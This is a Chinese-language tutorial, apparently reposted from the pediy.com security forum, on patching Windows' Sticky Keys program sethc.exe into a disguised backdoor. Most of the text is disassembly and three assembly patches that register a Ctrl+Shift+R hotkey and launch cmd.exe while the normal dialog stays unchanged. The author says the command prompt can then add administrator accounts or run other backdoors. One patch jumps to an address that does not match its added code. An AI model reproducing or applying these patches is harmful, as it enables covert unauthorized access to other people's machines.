
# 对 `sethc.exe` 文件 DIY，制作 shift 后门

> 原文：[`www.pediy.com/kssd/pediy12/130214.html`](https://www.pediy.com/kssd/pediy12/130214.html)

前两天在网上闲逛，看到一个制作 shift 后门的文章，再进一步搜索时，看到有人编程制作高仿真的 `sethc.exe` 文件，心想与其自己编造一个假的界面何不用它原来的界面，在原程序的基础上增加一个功能呢？这样的话原来的各个按钮功能均正常使用。

**DIY 目标：**

对 `sethc.exe` 文件进行改造，当按下事先定义后的快捷键时，弹出系统的 `cmd` 命令行窗口，这样就可以增加管理员等操作，或者是打开其它想运行的后门程序。

想到以下两个方案：

1. 增加一个加速键资源
2. 使用热键

`sethc.exe` 文件无法直接运行，运行后无任何反应。上网搜了一下，也没有介绍如何运行它的，跟踪时也一下就退出了，用 IDA 反了一下，它是一个基于模式对话框的程序，这样的话它本身没有消息循环，用加速键时不太好处理，于是采用了方案 2，在初始化对话框时用 `RegisterHotKey` 注册热键，在处理 `wm_command` 的时候，检查是否是 `wm_hotkey` 消息，并处理，在退出对话框时，用 `UnregisterHotKey` 取消热键。

在操作过程中需要用到的字符串数据如下：

- `cmd.exe`
- `winexec` (用这个因为它包含在 `KERNEL32.dll` 中，程序中已经加载了，参数也简单)
- `RegisterHotKey`
- `UnregisterHotKey`
- `KERNEL32.dll`
- `user32.dll`

要用到的 `loadlibary` 或者是 `GetModuleHandleA`, `GetProcAddress`，原程序中均有导入，直接调用即可。

对 `RegisterHotKey` 及 `UnregisterHotKey` 的参数设置，可以参考 MSDN。

因为两个 DLL 的名字在程序中已有，可以直接拿来用，其它四个需要增加，利用 peid 查看全 0 的空间，便于操作，全写在代码段了，为了给增加的代码多些空间，把新加的字符串写在了全 0 的头部或尾部

```
01006BCE     .  52 65 67 69 73 74 65>ascii "RegisterHotKey",0
01006BDD     .  55 6E 72 65 67 69 73>ascii "UnregisterHotKey"
01006BED     .  00                   ascii 0
01006BEE     .  57 69 6E 45 78 65 63>ascii "WinExec",0
01006BF6     .  63 6D 64 2E 65 78 65>ascii "cmd.exe",0
```

程序中原有的

```
0100685C  .  4B 45 52 4E 45 52 >ascii "KERNEL32.dll",0
01006A38  .  55 53 45 52 33 32 >ascii "USER32.dll",0
```

在 reshack 中可以看到各按钮的 ID：

```
CONTROL "确定", 1, BUTTON, BS_PUSHBUTTON | WS_CHILD | WS_VISIBLE | WS_TABSTOP, 50, 66, 50, 14

   CONTROL "取消", 2, BUTTON, BS_DEFPUSHBUTTON | WS_CHILD | WS_VISIBLE | WS_TABSTOP, 108, 66, 50, 14

   CONTROL "设置(&S)", 9, BUTTON, BS_PUSHBUTTON | WS_CHILD | WS_VISIBLE | WS_TABSTOP, 166, 66, 50, 14

   CONTROL "", 4657, STATIC, SS_LEFT | WS_CHILD | WS_VISIBLE | WS_GROUP, 9, 5, 250, 57
```

在 IDA 中很容易找到对话框的 `dlgproc` 过程

```
WM_INITDIALOG =  0x0110
WM_COMMAND     =  0x0111
```

```
010028F5  |.  8B45 0C        mov eax,[arg.2]---------------------------->获取消息 ID
010028F8  |.  2D 10010000   sub eax,110                 ;  Switch (cases 110..111)---对这里进行第二处补丁，处理热键消息
010028FD  |.  0F84 BC000000 je 010029BF  ---------------------------------------->跳到处理 WM_INITDIALOG 消息
01002903  |.  48            dec eax
01002904  |.  74 07         je short 0100290D---------------------------------------->跳到处理 WM_CMMAND 消息
01002906  |>  33C0         xor eax,eax                   ;
01002908  |.  E9 D6000000  jmp 010029E3
0100290D  |>  6A 08        push 8    --------------------------------------->开始处理 WM_CMMAND 消息
0100290F  |.  FFB5 14FFFFFF push [local.59]                   ; |hWnd
01002915  |.  FF15 54110001 call dword ptr ds:[<&USER32.GetWindowLon>; \GetWindowLongW
0100291B  |.  8BF0        mov esi,eax
0100291D  |.  0FB745 10   movzx eax,word ptr ss:[ebp+10]
01002921  |.  33FF        xor edi,edi
01002923  |.  3BC7        cmp eax,edi
01002925  |.^ 7E DF       jle short 01002906
01002927  |.  83F8 02     cmp eax,2       ---------------------------------------->取消按钮的 ID，退出程序
0100292A  |.  0F8E 80000000 jle 010029B0
01002930  |.  83F8 09     cmp eax,9       ---------------------------------------->设置按钮的 ID
01002933  |.^ 75 D1       jnz short 01002906
01002935  |.  6A 02       push 2                    ; /Result = 2
01002937  |.  FFB5 14FFFFFF push [local.59]                   ; |hWnd
0100293D  |.  FF15 50110001 call dword ptr ds:[<&USER32.EndDialog>]  ; \EndDialog
01002943  |.  68 70140001 push 01001470                   ; /String2 = " Shell32.dll,Control_RunDLL access.cpl,,"
01002948  |.  8D85 18FFFFFF lea eax,[local.58]                   ; |
0100294E  |.  50            push eax                    ; |String1
0100294F  |.  FF15 30100001 call dword ptr ds:[<&KERNEL32.lstrcpyW>] ; \lstrcpyW
01002955  |.  8B06        mov eax,dword ptr ds:[esi]
01002957  |.  83E8 03     sub eax,3
0100295A  |.  74 18       je short 01002974
0100295C  |.  48            dec eax
0100295D  |.  48            dec eax
0100295E  |.  8D85 18FFFFFF lea eax,[local.58]
01002964  |.  74 07       je short 0100296D
01002966  |.  68 6C140001 push 0100146C
0100296B  |.  EB 12       jmp short 0100297F
0100296D  |>  68 68140001 push 01001468
01002972  |.  EB 0B       jmp short 0100297F
01002974  |>  68 64140001 push 01001464
01002979  |.  8D85 18FFFFFF lea eax,[local.58]
0100297F  |>  50            push eax                    ; |ConcatString
01002980  |.  FF15 40100001 call dword ptr ds:[<&KERNEL32.lstrcatW>] ; \lstrcatW
01002986  |.  8D85 04FFFFFF lea eax,[local.63]
0100298C  |.  50            push eax                    ; /pProcessInfo
0100298D  |.  8D85 C0FEFFFF lea eax,[local.80]                   ; |
01002993  |.  50            push eax                    ; |pStartupInfo
01002994  |.  57            push edi                    ; |CurrentDir
01002995  |.  57            push edi                    ; |pEnvironment
01002996  |.  57            push edi                    ; |CreationFlags
01002997  |.  57            push edi                    ; |InheritHandles
01002998  |.  57            push edi                    ; |pThreadSecurity
01002999  |.  57            push edi                    ; |pProcessSecurity
0100299A  |.  8D85 18FFFFFF lea eax,[local.58]                   ; |
010029A0  |.  50            push eax                    ; |CommandLine
010029A1  |.  8D45 E0       lea eax,[local.8]                    ; |
010029A4  |.  50            push eax                    ; |ModuleFileName
010029A5  |.  FF15 3C100001 call dword ptr ds:[<&KERNEL32.CreateProc>; \CreateProcessW
010029AB  |>  33C0        xor eax,eax
010029AD  |.  40            inc eax
010029AE  |.  EB 33       jmp short 010029E3
010029B0  |>  50            push eax      ------------------------------------->退出程序,进行第三处补丁，取消注册热键
010029B1  |.  FFB5 14FFFFFF push [local.59]                   ; |hWnd
010029B7  |.  FF15 50110001 call dword ptr ds:[<&USER32.EndDialog>]  ; \EndDialog
010029BD  |.^ EB EC       jmp short 010029AB
010029BF  |>  53            push ebx        -------------------------------->此处开始处理 WM_INITDIALOG 消息
010029C0  |.  6A 08       push 8                    ; |Index = 8.
010029C2  |.  FFB5 14FFFFFF push [local.59]                   ; |hWnd
010029C8  |.  FF15 4C110001 call dword ptr ds:[<&USER32.SetWindowLon>; \SetWindowLongW
010029CE  |.  8D43 0C     lea eax,dword ptr ds:[ebx+C]-----------------------对这里进行第一处补丁，注册热键
010029D1  |.  50            push eax
010029D2  |.  FF73 04     push dword ptr ds:[ebx+4]
010029D5  |.  FF73 08     push dword ptr ds:[ebx+8]
010029D8  |.  FFB5 14FFFFFF push [local.59]
010029DE  |.  E8 0CFDFFFF call 010026EF
010029E3  |>  8B4D FC     mov ecx,[local.1]
010029E6  |.  5F            pop edi
010029E7  |.  5E            pop esi
010029E8  |.  5B            pop ebx
010029E9  |.  E8 AE050000 call 01002F9C
010029EE  |.  C9            leave
010029EF  \.  C2 1000     retn 10
```

**第一处补丁：初始化对话框时，注册的热键**

原代码修改处：

```
010029CE    /E9 1D410000  jmp 01006AE0
010029D3    |90            nop
010029D4    |90            nop
```

新增加的代码，注册的热键 crtl+shift+r     ID 为 0101h

```
0x01006AE0:
        pushad
        pushfd
        push 01006A38h                 ; ASCII "USER32.dll"
        call dword ptr ds:[100107C]    ; kernel32.GetModuleHandleA
        push 01006BCEh                 ; ASCII "RegisterHotKey"
        push eax
```



`call dword ptr ds:[1001028]` `; kernel32.GetProcAddress`

`push 052h` `;; VK_R`

`push 6` `;;;crtl+shift`

`push 0101h`

`push dword ptr ss:[ebp-0ECh]`

`call eax`

`popfd`

`popad`

`lea eax,dword ptr ds:[ebx+0Ch]`

`push eax`

`push dword ptr ds:[ebx+4]`

`jmp @sethc_010029D5`

第二处补丁，处理热键消息 `WM_HOTKEY = 0x0312`

原代码修改处：

`010028F8` `.` `E9` `43420000` `jmp` `01006B40`

新增加的代码，如果按了热键，运行 `cmd.exe`

`0x01006B40:`

`pushad`

`pushfd`

`cmp eax,0312h`

`jnz @sethc_01006B75`

`mov eax,dword ptr ss:[ebp+010h]`

`cmp eax,0101h`

`jnz @sethc_01006B75`

`push 0100685Ch` `; ASCII "KERNEL32.dll"`

`call dword ptr ds:[100107C]` `; kernel32.GetModuleHandleA`

`push 01006BEEh` `; ASCII "WinExec"`

`push eax`

`call dword ptr ds:[1001028]` `; kernel32.GetProcAddress`

`push 1`

`push 01006BF6h` `; ASCII "cmd.exe"`

`call eax`

`@sethc_01006B75:`

`popfd`

`popad`

`sub eax,0110h`

`jmp @sethc_010028FD`

第三处补丁，退出时处理：取消注册的热键

原代码修改处：

`01002935` `/E9` `16420000` `jmp` `01006B50`

`0100293A` `|90` `nop`

`0100293B` `|90` `nop`

`0100293C` `|90` `nop`

新增加的代码，

`0x01006B90:`

`push 01006A38h` `; ASCII "USER32.dll"`

`call dword ptr ds:[100107C]` `; kernel32.GetModuleHandleA`

`push 01006BDDh` `; ASCII "UnregisterHotKey"`

`push eax`

`call dword ptr ds:[1001028]` `; kernel32.GetProcAddress`

`push 0101h`

`push dword ptr ss:[ebp-0ECh]`

`call eax`

`push 2`

`push dword ptr ss:[ebp-0ECh]`

`jmp @sethc_0100293D`

到此，程序修改完毕，按五下 `shift` 时，会弹出正常的界面，各功能正常，此时按下 `ctrl+shift+r`，即弹出了 `cmd.exe` 的黑窗口。

本来按五秒钟 `NUmlock` 键，也可以运行 `sethc.exe` 文件，也可以用这个后门。
